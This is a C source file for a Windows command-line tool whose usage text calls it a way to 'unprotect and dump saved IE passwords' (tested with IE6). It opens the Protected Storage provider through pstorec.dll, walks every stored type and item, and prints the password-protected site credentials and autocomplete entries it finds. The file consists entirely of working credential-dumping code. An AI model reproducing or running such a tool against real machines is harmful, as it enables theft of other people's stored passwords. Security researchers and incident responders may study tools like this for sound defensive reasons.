#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>

#include "utils.h"

/* import type information from pstorec library */
#import "pstorec.dll" no_namespace

/* Link with the Advapi32.lib file */
#pragma comment(lib, "Advapi32.lib")

typedef HRESULT (WINAPI *PStoreCreateInstance_t)(IPStore **, DWORD, DWORD, DWORD);

static void usage(char* exe );
static void dump_ie6();

unsigned int log_level = LOG_LEVEL_NONE;

int main(int argc, char **argv){
    if (argc == 2) {
        if ( !strncmp(argv[1], "-vv", 3)) {
            log_level = LOG_LEVEL_VERY_VERBOSE;
        } else if (!strncmp(argv[1], "-v", 2)) {
            log_level = LOG_LEVEL_VERBOSE;
        }
        else if (!strncmp(argv[1], "-h", 2)) {
            usage(argv[0]);
            exit(0);
        }
    } else if (argc >= 3) {
        printf("Invalid parameters\n");
        exit(1);
    }

    dump_ie6();

    return 0;
}

static void usage(char* exe ) {
    printf( "Unprotect and dump saved IE passwords\n" );
    printf( "(tested with IE6)\n" );
    printf( "%s [-v | -vv | -h]\n-v\tVerbose\n-vv\tVery verbose\n-h\tHelp", exe );
}

static void dump_ie6()
{
    HRESULT rc = 0;

    int lCounter = 0;
    int lCounter2 = 0;
    GUID lTypeGUID;
    char lItemName[512];
    char lItemData[512];
    char lItemGUID[128];

    GUID lSubTypeGUID;
    char lCheckingData[256];
    unsigned long lDataLength = 0;
    unsigned char *lDataPointer = NULL;
    _PST_PROMPTINFO *lPSTInfo = NULL;

    IEnumPStoreItemsPtr lSPEnumItems;
    IEnumPStoreTypesPtr lEnumSubTypes;
    LPWSTR lTempItemName;

    /* get PStoreCreateInstance function ptr from DLL */
    PStoreCreateInstance_t PStoreCreateInstance_func;

    HMODULE lib_handle = LoadLibrary("pstorec.dll");
    PStoreCreateInstance_func = (PStoreCreateInstance_t) GetProcAddress(lib_handle, "PStoreCreateInstance");
    if (NULL == PStoreCreateInstance_func){
        HandleError("GetProcAddress");
    }

    /* Get a pointer to the Protected Storage provider */
    IPStore *ps_provider;
    PStoreCreateInstance_func(&ps_provider,
            NULL,   // get base storage provider
            0,      // reserved
            0       // reserved
    );

    /* Get an interface for enumerating registered types from protected db */
    IEnumPStoreTypesPtr enum_types;
    rc = ps_provider->EnumTypes(0,      // PST_KEY_CURRENT_USER
            0,                          // Reserved, must be set to 0
            &enum_types
    );

    if (0 != rc ) {
        printf("IPStore::EnumTypes method failed.\n");
        ExitProcess(1);
    }

    while(enum_types->raw_Next(1, &lTypeGUID, 0) == S_OK)
    {
        wsprintf(lItemGUID, "%x", lTypeGUID);
        ps_provider->EnumSubtypes(0, &lTypeGUID, 0, &lEnumSubTypes);

        while(lEnumSubTypes->raw_Next(1, &lSubTypeGUID, 0) == S_OK)
        {
            ps_provider->EnumItems(0, &lTypeGUID, &lSubTypeGUID, 0, &lSPEnumItems);


            while(lSPEnumItems->raw_Next(1, &lTempItemName, 0) == S_OK)
            {
                wsprintf(lItemName, "%ws", lTempItemName);
                ps_provider->ReadItem(0, &lTypeGUID, &lSubTypeGUID, lTempItemName, &lDataLength, &lDataPointer, lPSTInfo, 0);

                if ((unsigned) lstrlen((char *)lDataPointer) < (lDataLength - 1))
                {
                    for(lCounter2 = 0, lCounter = 0; (unsigned) lCounter2 < lDataLength; lCounter2 += 2)
                    {
                        if (lDataPointer[lCounter2] == 0)
                            lItemData[lCounter] = ',';
                        else
                            lItemData[lCounter] = lDataPointer[lCounter2];

                        lCounter++;
                    } // for(lCounter2 =...

                    lItemData[lCounter - 1] = 0;
                } else {
                    wsprintf(lItemData, "%s", lDataPointer);
                } // if ((unsigned) lstrl...


                /*
                 * 5e7e8100 - IE:Password-Protected sites
                 *
                 */

                if (lstrcmp(lItemGUID, "5e7e8100") == 0)
                {
                    lstrcpy(lCheckingData, "");
                    if (strstr(lItemData, ":") != 0)
                    {
                        lstrcpy(lCheckingData, strstr(lItemData,":") + 1);
                        *(strstr(lItemData, ":")) = 0;
                    } // if (strstr(lItemDa...

                    printf("%-50s %-20s %-15s %-15s\n", lItemName, "PW rotected site", lItemData, lCheckingData);
                } // if (lstrcmp(lItemGUI...



                /*
                 * e161255a IE
                 *
                 */

                if (lstrcmp(lItemGUID, "e161255a") == 0)
                {
                    if (strstr(lItemName, "StringIndex") == 0)
                    {
                        if (strstr(lItemName, ":String") != 0)
                            *strstr(lItemName, ":String") = 0;

                        lstrcpyn(lCheckingData, lItemName, 8);
                        if ((strstr(lCheckingData, "http:/") == 0) && (strstr(lCheckingData, "https:/") == 0))
                            printf("%-50s %-20s %-15s %-15s\n", lItemName, "Auto complete", lItemData, "");
                        else {
                            lstrcpy(lCheckingData, "");
                            if (strstr(lItemData, ",") != 0)
                            {
                                lstrcpy(lCheckingData, strstr(lItemData, ",") + 1);
                                *(strstr(lItemData, ",")) = 0;
                            } // if (strstr(lItem...
                            printf("%-50s %-20s %-15s %-15s\n", lItemName, "Auto complete", lItemData, lCheckingData);

                        } // if ((strstr(lCheckingD...
                    } // if (strstr(lItemName, "StringIndex") ...
                } else {
                    if (strstr(lItemName, "StringIndex") == 0)
                    {
                        if (strstr(lItemName, ":String") != 0)
                            *strstr(lItemName, ":String") = 0;

                        lstrcpyn(lCheckingData, lItemName,8);
                        if ((strstr(lCheckingData, "http:/") == 0) && (strstr(lCheckingData, "https:/") == 0))
                            printf("%-50s %-20s %-15s %-15s\n", lItemName, "Auto complete", lItemData, "");
                        else {
                            lstrcpy(lCheckingData, "");
                            if (strstr(lItemData, ",")!= 0)
                            {
                                lstrcpy(lCheckingData, strstr(lItemData, ",") + 1);
                                *(strstr(lItemData, ","))=0;
                            } // if (strstr(lIte...
                            printf("%-50s %-20s %-15s %-15s\n", lItemName, "Auto complete", lItemData, lCheckingData);
                        } // if ((strstr(lChecking...
                    } // if (strstr(lItemNa...
                } // if (lstrcmp(lItemGUID, "e161255a...

                ZeroMemory(lItemName, sizeof(lItemName));
                ZeroMemory(lItemData, sizeof(lItemData));

            } // while(lSPEnumItems->raw_Ne...
        } // while(lEnumSubTypes->raw_Next(1,...
    } // while(lEnumPStoreTypes->raw_...

}
